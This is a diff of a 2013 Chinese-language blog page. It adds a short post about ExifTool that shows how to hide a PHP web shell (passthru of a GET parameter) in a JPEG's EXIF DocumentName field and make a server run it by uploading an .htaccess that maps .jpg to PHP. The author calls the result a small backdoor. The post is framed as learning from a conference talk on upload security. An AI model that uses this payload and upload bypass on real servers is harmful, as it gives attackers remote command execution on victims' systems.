@@ -9,7 +9,7 @@
   <meta name="author" content="atdog">
 
   
-  <meta name="description" content="Wix.com 最近似乎在Facebook竄紅起來， Wix主打提供使用者快速建立web site的功能， 使用者僅需要用滑鼠做些基本的操作、或是會點flash，而不需有任何HTML的腦袋， 就可以完成一樣不錯的作品， 不過這邊要跟大家介紹一些Wix.com的小秘密， &hellip;">
+  <meta name="description" content="最近在網路上找Image exif的修改工具 for Mac， 最後找到 ExifTool 不過，為什麼要找Exif的修改工具呢？ 其實是在看到Orange在Web Conf所講的Talk後才想找的， 安裝完 ExifTool 之後， 1.觀看圖片的Exif資訊 $ exiftool test. &hellip;">
   
 
   <!-- http://t.co/dKP3o1e -->
@@ -76,6 +76,85 @@
     <div id="content">
       <div class="blog-index">
   
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2013/02/27/image-exif-tool/">Image Exif Tool</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2013-02-27T15:58:00+08:00" pubdate data-updated="true">Feb 27<span>th</span>, 2013</time>
+        
+         | <a href="/blog/2013/02/27/image-exif-tool/#disqus_thread">Comments</a>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>最近在網路上找Image exif的修改工具 for Mac，</p>
+
+<p>最後找到 <a href="http://www.sno.phy.queensu.ca/~phil/exiftool/">ExifTool</a></p>
+
+<p>不過，為什麼要找Exif的修改工具呢？</p>
+
+<p>其實是在看到<a href="http://blog.orange.tw">Orange</a>在Web Conf所講的<a href="http://www.slideshare.net/p8361/webconf-2013best-practices-the-upload">Talk</a>後才想找的，</p>
+
+<p>安裝完 <a href="http://www.sno.phy.queensu.ca/~phil/exiftool/">ExifTool</a> 之後，</p>
+
+<p>1.觀看圖片的Exif資訊</p>
+
+<pre><code>$ exiftool test.jpg
+</code></pre>
+
+<p>2.修改圖片的Exif資訊，e.g., Document Name</p>
+
+<pre><code>$ exiftool exiftool -documentname='&lt;?php passthru($_GET[cmd]); __halt_compiler();?&gt;' test.jpg
+$ file test.jpg
+./test.jpg JPEG: image data, JFIF standard 1.01
+</code></pre>
+
+<p>大概是像上面這樣，</p>
+
+<p>所以我們可以透過上傳test.jpg 以及 .htaccess</p>
+
+<pre><code>$ cat .htaccess
+addhandler application/x-httpd-php .jpg
+</code></pre>
+
+<p>這是為了做什麼？</p>
+
+<p>上傳後執行可以看到這樣的畫面</p>
+
+<p><img src="images/imageup1.png" title="image upload" alt="image upload" /></p>
+
+<br>
+
+
+<p><img src="images/imageup2.png" title="image upload" alt="image upload" /></p>
+
+<p>其實就是個小後門!</p>
+</div>
+  
+  
+
+
+    </article>
   
   
     <article>
@@ -619,6 +698,10 @@
   <ul id="recent_posts">
     
       <li class="post">
+        <a href="/blog/2013/02/27/image-exif-tool/">Image exif tool</a>
+      </li>
+    
+      <li class="post">
         <a href="/blog/2013/02/27/wix-dot-com/">Wix.com</a>
       </li>
     
@@ -632,10 +715,6 @@
     
       <li class="post">
         <a href="/blog/2012/11/26/android-apps-exploit-poc/">Android apps - Exploit poc</a>
-      </li>
-    
-      <li class="post">
-        <a href="/blog/2012/11/04/the-future/">The Future</a>
       </li>
     
   </ul>
